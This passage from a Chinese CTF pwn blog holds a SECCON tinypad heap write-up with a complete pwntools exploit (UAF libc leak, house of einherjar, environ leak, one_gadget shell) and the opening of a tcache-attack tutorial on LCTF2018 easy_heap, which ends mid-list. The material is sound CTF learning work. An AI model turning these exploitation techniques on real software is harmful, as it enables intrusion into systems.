++v14;</span><br><span class="line">      if ( v14 &#x3D;&#x3D; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 &#x3D; 17LL;</span><br><span class="line">        v4 &#x3D; &quot;No space is left.&quot;;</span><br><span class="line">        writeln(&quot;No space is left.&quot;, 17LL);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v16 &#x3D; -1;</span><br><span class="line">        write_n(&quot;(SIZE)&gt;&gt;&gt; &quot;, 10LL);</span><br><span class="line">        v16 &#x3D; read_int(&quot;(SIZE)&gt;&gt;&gt; &quot;, 10LL);</span><br><span class="line">        if ( v16 &lt;&#x3D; 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 &#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v7 &#x3D; v16;</span><br><span class="line">          if ( v16 &gt; 0x100 )</span><br><span class="line">            v7 &#x3D; 256;</span><br><span class="line">        &#125;</span><br><span class="line">        v16 &#x3D; v7;</span><br><span class="line">        *&amp;tinypad[16 * (v14 + 16LL)] &#x3D; v7;</span><br><span class="line">        *&amp;tinypad[16 * (v14 + 16LL) + 8] &#x3D; malloc(v16);</span><br><span class="line">        if ( !*&amp;tinypad[16 * (v14 + 16LL) + 8] )</span><br><span class="line">        &#123;</span><br><span class="line">          writerrln(&quot;[!] No memory is available.&quot;, 27LL);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</span><br><span class="line">        read_until(*&amp;tinypad[16 * (v14 + 16LL) + 8], v16, 0xAu);</span><br><span class="line">        v3 &#x3D; 7LL;</span><br><span class="line">        v4 &#x3D; &quot;\nAdded.&quot;;</span><br><span class="line">        writeln(&quot;\nAdded.&quot;, 7LL);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v15 !&#x3D; 81 );</span><br><span class="line">  result &#x3D; 0;</span><br><span class="line">  v11 &#x3D; *MK_FP(__FS__, 40LL) ^ v17;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞函数如下："><a href="#漏洞函数如下：" class="headerlink" title="漏洞函数如下："></a>漏洞函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned __int64 __fastcall read_until(__int64 a1, unsigned __int64 a2, unsigned int a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 result; &#x2F;&#x2F; rax@3</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; rcx@12</span><br><span class="line">  unsigned int v5; &#x2F;&#x2F; [sp+Ch] [bp-34h]@1</span><br><span class="line">  unsigned __int64 i; &#x2F;&#x2F; [sp+28h] [bp-18h]@1</span><br><span class="line">  signed __int64 v7; &#x2F;&#x2F; [sp+30h] [bp-10h]@2</span><br><span class="line">  __int64 v8; &#x2F;&#x2F; [sp+38h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; a3;</span><br><span class="line">  v8 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  for ( i &#x3D; 0LL; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 &#x3D; read_n(0, a1 + i, 1uLL);</span><br><span class="line">    if ( v7 &lt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; -1LL;</span><br><span class="line">      goto LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !v7 || *(a1 + i) &#x3D;&#x3D; v5 )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  *(a1 + i) &#x3D; 0;                                &#x2F;&#x2F; off by one</span><br><span class="line">  if ( i &#x3D;&#x3D; a2 &amp;&amp; *(a2 - 1 + a1) !&#x3D; 10 )</span><br><span class="line">    dummyinput(v5);</span><br><span class="line">  result &#x3D; i;</span><br><span class="line">LABEL_12:</span><br><span class="line">  v4 &#x3D; *MK_FP(__FS__, 40LL) ^ v8;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p>1.程序free的时候只将size位清空，而没有将指针清空，就导致uaf漏洞，我们可以通过该漏洞泄露heap_base。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x70,&#39;L0ne1y&#39;)</span><br><span class="line">add(0x70,&#39;L0ne1y&#39;)</span><br><span class="line">add(0x100,&#39;L0ne1y&#39;)</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line">sh.recvuntil(&#39; # CONTENT: &#39;) </span><br><span class="line">heap_addr&#x3D;u64(sh.recvline().rstrip().ljust(8, &#39;\x00&#39;))-0x80</span><br><span class="line">sh.success(&#39;heap_addr: &#39; +hex(heap_addr))</span><br></pre></td></tr></table></figure>

<p>2.通过UAF泄露libc_base。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">free(3)</span><br><span class="line">sh.recvuntil(&#39; # CONTENT: &#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20   #leak libc_base</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br></pre></td></tr></table></figure>

<p>​    因为chunk3和top chunk相邻，所以释放时不会被加入Unsorted Bin。然后直接合并到top chunk中。然后此时，fastbin中有两个相邻堆块，并且与top chunk相邻，会触发合并，fastbin-&gt; 1-&gt; 2，首先1会先被加入unsorted bin中，此时chunk 1’so fd和bk指针会指向main_arena + 88（Unsorted Bin）地址。然后chunk 2和chunk 1合并成一个新的chunk放入unsorted bin中。这个过程并不会改变chunk 1的fd和bk指针。所以此时输出memo 1的内容就会输出unsorted bin的地址，继而算出libc地址。</p>
<p>3.house of einherjar攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x18, &#39;a&#39;*0x10)  #1</span><br><span class="line">add(0x100, &#39;b&#39;*0xf8+&#39;\x11&#39;) #2   </span><br><span class="line">add(0x100, &#39;c&#39;*0xf8) #3</span><br><span class="line">add(0x100, &#39;d&#39;*0xf8) #4</span><br><span class="line"></span><br><span class="line">tinypad &#x3D; 0x0000000000602040</span><br><span class="line">offest&#x3D;heap_addr+0x20-0x602060</span><br><span class="line">sh.success(&#39;offest : &#39; +hex(offest))</span><br><span class="line">fake_chunk&#x3D;p64(0)+p64(0x101)+p64(0x602060)*2</span><br><span class="line">edit(3,&#39;c&#39;*0x20+fake_chunk)</span><br><span class="line">free(1)</span><br><span class="line">add(0x18,&#39;a&#39;*0x10+p64(offest))</span><br><span class="line">free(2)</span><br><span class="line">edit(4, &quot;4&quot;*0x20 + p64(0) + p64(0x101) + p64(main_arena + 88)*2)</span><br><span class="line">#gdb.attach(sh)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x100, &#39;b&#39;*0xf8+&#39;\x11&#39;) #2</span><br></pre></td></tr></table></figure>

<p>​    因为off by one 导致chunk3的size位变为0，所以需要伪造上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">edit(3,&#39;c&#39;*0x20+fake_chunk)</span><br></pre></td></tr></table></figure>

<p>​    这里需要在tinypad伪造chunk，为后续house of einherjar做准备。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x18,&#39;a&#39;*0x10+p64(offest))</span><br></pre></td></tr></table></figure>

<p>​    覆盖prev_size，准备unlink</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">edit(4, &quot;4&quot;*0x20 + p64(0) + p64(0x101) + p64(main_arena + 88)*2)</span><br></pre></td></tr></table></figure>

<p>​    0x101是为了后面分配用的，而p64(leak_libc+88)*2 这里，你只要bk是个可写的地址就行了，不要是不可写的就行，unsortedbin攻击里讲过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#在 glibc&#x2F;malloc&#x2F;malloc.c 中的 _int_malloc 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 bck-&gt;fd 的位置写入本 Unsorted Bin 的位置。</span><br><span class="line"></span><br><span class="line">          &#x2F;* remove from unsorted list *&#x2F;</span><br><span class="line">          if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))</span><br><span class="line">            malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk &#x3D; bck;</span><br><span class="line">          bck-&gt;fd &#x3D; unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>4.获取environ指针</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">one_gadget&#x3D;libc_base+0xf1207</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line">environ_pointer&#x3D;libc_base+libc.symbols[&#39;__environ&#39;]</span><br><span class="line">sh.success(&#39;environ_pointer : &#39; +hex(environ_pointer))</span><br></pre></td></tr></table></figure>

<p>​    在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，可通过 environ 指针泄露栈地址。</p>
<p>相关知识：</p>
<p><a href="http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/" target="_blank" rel="noopener external nofollow noreferrer">http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/</a></p>
<p>5.get shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0xf0, &#39;1&#39;*0xd0 + p64(0x18) + p64(environ_pointer)+&#39;a&#39;*8+p64(0x602148))</span><br><span class="line">sh.recvuntil(&quot; #   INDEX: 1\n&quot;)</span><br><span class="line">sh.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">main_ret&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-0xf0</span><br><span class="line">sh.success(&#39;main_ret : &#39; +hex(main_ret))</span><br><span class="line">edit(2, p64(main_ret))</span><br><span class="line">edit(1, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">sh.sendline(&#39;q&#39;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0xf0, &#39;1&#39;*0xd0 + p64(0x18) + p64(environ_pointer)+&#39;a&#39;*8+p64(0x602148))</span><br></pre></td></tr></table></figure>

<p>​    将[tinypad +256]中的Chunk2的堆栈地址修改为chunk1，将chunk1的堆栈地址修改为Environ_pointer，泄露Environ_pointer的栈地址，得到main_ret地址，再造成main_ret-&gt;one_gadget的情况。</p>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;tinypad&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;tinypad&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">	sh.sendline(&#39;A&#39;)</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(&#39;E&#39;)</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(content)</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">	sh.sendline(&#39;Y&#39;)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(&#39;D&#39;)</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x70,&#39;L0ne1y&#39;)</span><br><span class="line">add(0x70,&#39;L0ne1y&#39;)</span><br><span class="line">add(0x100,&#39;L0ne1y&#39;)</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line">sh.recvuntil(&#39; # CONTENT: &#39;)   #leak heap_base</span><br><span class="line">heap_addr&#x3D;u64(sh.recvline().rstrip().ljust(8, &#39;\x00&#39;))-0x80</span><br><span class="line">sh.success(&#39;heap_addr: &#39; +hex(heap_addr))</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line">sh.recvuntil(&#39; # CONTENT: &#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20   #leak libc_base</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">add(0x18, &#39;a&#39;*0x10)  #1</span><br><span class="line">add(0x100, &#39;b&#39;*0xf8+&#39;\x11&#39;) #2</span><br><span class="line">add(0x100, &#39;c&#39;*0xf8) #3</span><br><span class="line">add(0x100, &#39;d&#39;*0xf8) #4</span><br><span class="line"></span><br><span class="line">#house of einherjar</span><br><span class="line">tinypad &#x3D; 0x0000000000602040</span><br><span class="line">offest&#x3D;heap_addr+0x20-0x602060</span><br><span class="line">sh.success(&#39;offest : &#39; +hex(offest))</span><br><span class="line">fake_chunk&#x3D;p64(0)+p64(0x101)+p64(0x602060)*2</span><br><span class="line">edit(3,&#39;c&#39;*0x20+fake_chunk)</span><br><span class="line">free(1)</span><br><span class="line">add(0x18,&#39;a&#39;*0x10+p64(offest))</span><br><span class="line">free(2)</span><br><span class="line">edit(4, &quot;4&quot;*0x20 + p64(0) + p64(0x101) + p64(main_arena + 88)*2)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#get environ</span><br><span class="line">one_gadget&#x3D;libc_base+0xf1207</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line">environ_pointer&#x3D;libc_base+libc.symbols[&#39;__environ&#39;]</span><br><span class="line">sh.success(&#39;environ_pointer : &#39; +hex(environ_pointer))</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#Modified the stack addresses of Chunk2 in [Tinypad +256] to chunk1 and the stack addresses of Chunk1 to Environ_pointer</span><br><span class="line">add(0xf0, &#39;1&#39;*0xd0 + p64(0x18) + p64(environ_pointer)+&#39;a&#39;*8+p64(0x602148))</span><br><span class="line"></span><br><span class="line">#get shell</span><br><span class="line">sh.recvuntil(&quot; #   INDEX: 1\n&quot;)</span><br><span class="line">sh.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">main_ret&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-0xf0</span><br><span class="line">sh.success(&#39;main_ret : &#39; +hex(main_ret))</span><br><span class="line">edit(2, p64(main_ret))</span><br><span class="line">edit(1, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">sh.sendline(&#39;q&#39;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://v1ckydxp.github.io/2019/07/07/House_Of_Einherjar--2016-Seccon-tinypad-writeup/" target="_blank" rel="noopener external nofollow noreferrer">https://v1ckydxp.github.io/2019/07/07/House_Of_Einherjar--2016-Seccon-tinypad-writeup/</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_einherjar-zh/" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_einherjar-zh/</a></p>
<p><a href="https://noonegroup.xyz/posts/14c79378/" target="_blank" rel="noopener external nofollow noreferrer">https://noonegroup.xyz/posts/14c79378/</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcache_bin_Attack</title>
    <url>/2020/09/25/tcache-bin-attack/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/Jsv4nGuyk3gi5OE.png" alt="alt"></p>
<a id="more"></a>

<h3 id="Tcache-bin"><a href="#Tcache-bin" class="headerlink" title="Tcache_bin"></a>Tcache_bin</h3><p>tcache是glibc2.26后新加入的一种缓存机制（在Ubuntu 18及之后的版本中应用），提升了不少性能，但是与此同时也大大牺牲了安全性，在ctf-wiki中介绍tcache的标题便是tcache makes heap exploitation easy again，与fastbin非常相似但优先级高于fastbin，且相对于fastbin来说少了很多检查，所以更加便于进行漏洞利用。</p>
<ol>
<li>tcache机制的主体是tcache_perthread_struct结构体，其中包含单链表tcache_entry</li>
<li>单链表tcache_entry，也即tcache Bin的默认最大数量是<strong>64</strong>，在64位程序中申请的最小chunk size为32，之后以16字节依次递增，所以size大小范围是0x20-0x410，也就是说我们必须要malloc size≤0x408的chunk</li>
<li>每一个单链表tcache Bin中默认允许存放的chunk块最大数量是<strong>7</strong></li>
<li>在申请chunk块时，如果<code>tcache Bin</code>中有符合要求的chunk，则直接返回；如果在fastbin中有符合要求的chunk，则先将对应fastbin中其他chunk加入相应的tcache Bin中，直到达到tcache Bin的数量上限，然后返回符合符合要求的chunk；如果在smallbin中有符合要求的chunk，则与fastbin相似，先将双链表中的其他剩余chunk加入到tcache中，再进行返回</li>
<li>在释放chunk块时，如果chunk size符合tcache Bin要求且相应的tcache Bin没有装满，则直接加入相应的tcache Bin</li>
<li>与fastbin相似，在tcache Bin中的chunk不会进行合并，因为它们的<code>pre_inuse</code>位会置成1</li>
</ol>
<h3 id="Tcache-bin-利用"><a href="#Tcache-bin-利用" class="headerlink" title="Tcache_bin 利用"></a>Tcache_bin 利用</h3><h4 id="Tcache-dup"><a href="#Tcache-dup" class="headerlink" title="Tcache dup"></a>Tcache dup</h4><p>与fastbin dup相似，它比fastbin dup更好利用，漏洞利用原因在于向tcache Bin中插入chunk的函数<code>tcache_put()</code>几乎没有检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们甚至无需在double free时插入一个无关chunk以绕过检查，可以直接对一个chunk进行多次释放操作。fastbin dup 是a-&gt;b-&gt;a,而tcache dup 直接a-&gt;a就可以利用。</p>
<p>这里我们做道题练习一下。</p>
<h3 id="LCTF2018-PWN-easy-heap-（例题在CTF-WIKI）"><a href="#LCTF2018-PWN-easy-heap-（例题在CTF-WIKI）" class="headerlink" title="LCTF2018 PWN easy_heap （例题在CTF WIKI）"></a>LCTF2018 PWN easy_heap （例题在CTF WIKI）</h3><h4 id="checksec-检查"><a href="#checksec-检查" class="headerlink" title="checksec 检查"></a>checksec 检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; ST08_8@1</span><br><span class="line">  int v4; &#x2F;&#x2F; eax@4</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  sub_A3A();</span><br><span class="line">  qword_202050 &#x3D; (__int64)calloc(0xA0uLL, 1uLL);</span><br><span class="line">  if ( !qword_202050 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;init error!&quot;);</span><br><span class="line">    exit_(&quot;init error!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_B38();</span><br><span class="line">      v4 &#x3D; read_number();</span><br><span class="line">      if ( v4 !&#x3D; 2 )</span><br><span class="line">        break;</span><br><span class="line">      free_(160LL, 1LL);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v4 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v4 &#x3D;&#x3D; 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        puts_(160LL, 1LL);</span><br><span class="line">      &#125;</span><br><span class="line">      else if ( v4 &#x3D;&#x3D; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        exit_(160LL);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下："><a href="#add函数如下：" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; &#x2F;&#x2F; rbx@7</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; [sp+0h] [bp-20h]@0</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+0h] [bp-20h]@10</span><br><span class="line">  int v4; &#x2F;&#x2F; [sp+4h] [bp-1Ch]@10</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+8h] [bp-18h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  LODWORD(v2) &#x3D; 0;</span><br><span class="line">  while ( (signed int)v2 &lt;&#x3D; 9 &amp;&amp; *(_QWORD *)(16LL * (signed int)v2 + qword_202050) )</span><br><span class="line">    LODWORD(v2) &#x3D; v2 + 1;</span><br><span class="line">  if ( (_DWORD)v2 &#x3D;&#x3D; 10 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;full!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v0 &#x3D; qword_202050;</span><br><span class="line">    *(_QWORD *)(v0 + 16LL * (signed int)v2) &#x3D; malloc(0xF8uLL);</span><br><span class="line">    if ( !*(_QWORD *)(16LL * (signed int)v2 + qword_202050) )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;malloc error!&quot;);</span><br><span class="line">      exit_(&quot;malloc error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;size \n&gt; &quot;, v2);</span><br><span class="line">    v4 &#x3D; read_number();</span><br><span class="line">    if ( (unsigned int)v4 &gt; 0xF8 )</span><br><span class="line">      exit_(&quot;size \n&gt; &quot;);</span><br><span class="line">    *(_DWORD *)(16LL * v3 + qword_202050 + 8) &#x3D; v4;</span><br><span class="line">    printf(&quot;content \n&gt; &quot;);</span><br><span class="line">    sub_BEC(*(_BYTE **)(16LL * v3 + qword_202050), *(_DWORD *)(16LL * v3 + qword_202050 + 8));</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="free函数如下："><a href="#free函数如下：" class="headerlink" title="free函数如下："></a>free函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall free_(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+4h] [bp-Ch]@1</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;index \n&gt; &quot;, a2);</span><br><span class="line">  v3 &#x3D; read_number();</span><br><span class="line">  if ( (unsigned int)v3 &gt; 9 || !*(_QWORD *)(16LL * (unsigned int)v3 + qword_202050) )</span><br><span class="line">    exit_(&quot;index \n&gt; &quot;);</span><br><span class="line">  memset(*(void **)(16LL * (unsigned int)v3 + qword_202050), 0, *(_DWORD *)(16LL * (unsigned int)v3 + qword_202050 + 8));</span><br><span class="line">  free(*(void **)(16LL * (unsigned int)v3 + qword_202050));</span><br><span class="line">  *(_DWORD *)(16LL * (unsigned int)v3 + qword_202050 + 8) &#x3D; 0;</span><br><span class="line">  *(_QWORD *)(16LL * (unsigned int)v3 + qword_202050) &#x3D; 0LL;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="show函数如下："><a href="#show函数如下：" class="headerlink" title="show函数如下："></a>show函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  int v3; &#x2F;&#x2F; [sp+4h] [bp-Ch]@1</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;index \n&gt; &quot;, a2);</span><br><span class="line">  v3 &#x3D; read_number();</span><br><span class="line">  if ( (unsigned int)v3 &gt; 9 || !*(_QWORD *)(16LL * (unsigned int)v3 + qword_202050) )</span><br><span class="line">    exit_(&quot;index \n&gt; &quot;);</span><br><span class="line">  puts(*(const char **)(16LL * (unsigned int)v3 + qword_202050));</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sub-BEC函数如下："><a href="#sub-BEC函数如下：" class="headerlink" title="sub_BEC函数如下："></a>sub_BEC函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_BEC(_BYTE *a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [sp+14h] [bp-Ch]@1</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  v3 &#x3D; 0;</span><br><span class="line">  if ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      read(0, &amp;a1[v3], 1uLL);</span><br><span class="line">      if ( a2 - 1 &lt; v3 || !a1[v3] || a1[v3] &#x3D;&#x3D; 10 )</span><br><span class="line">        break;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    a1[v3] &#x3D; 0; &#x2F;&#x2F;off by one</span><br><span class="line">    a1[a2] &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>这道题麻烦点就在于没办法直接溢出覆盖prev_size，所以需要换一种方式来构造prev_size。程序的libc是2.27的，有tcache bin</p>
<ol>
<li>将 <code>A -&gt; B -&gt; C</code> 三块 unsorted bin chunk 依次进行释放</li>
<li>A 和 B 合并，此时 C 前的 prev_size 写入为 0x200</li>
<li>A 、 B 、 C 合并，步骤 2 中写入的 0x200 依然保持</li>
<li>利用 unsorted bin 切分，分配出 A</li>
<li>利用 unsorted bin 切分，分配出 B，注意此时不要覆盖到之前的 0x200</li>
<li>将 A 再次释放为 unsorted bin 的堆块，使得 fd 和 bk 为有效链表指针</li>
